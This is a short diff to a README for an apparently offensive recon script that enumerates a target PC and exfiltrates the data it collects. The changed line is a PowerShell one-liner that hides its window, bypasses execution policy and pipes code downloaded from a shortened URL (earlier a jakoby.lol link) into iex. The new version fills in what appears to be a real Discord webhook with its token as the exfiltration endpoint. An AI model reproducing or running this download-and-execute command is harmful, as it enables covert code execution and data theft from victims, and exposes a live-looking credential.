@@ -66,7 +66,7 @@ This program enumerates a target PC to collect as much recon data as possible fo
 Fill in either or both of these two methods to exfil your collected data
 
 ```
-powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
+powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1092941991567958098/BQ8FXNRz0IXbbfssRY0l-r-29CDR6VmrBljMZ8XqrL5gj9YIgmiUfnAqIYvIrQoYH_8x';irm tinyurl.com/advrecon1 | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
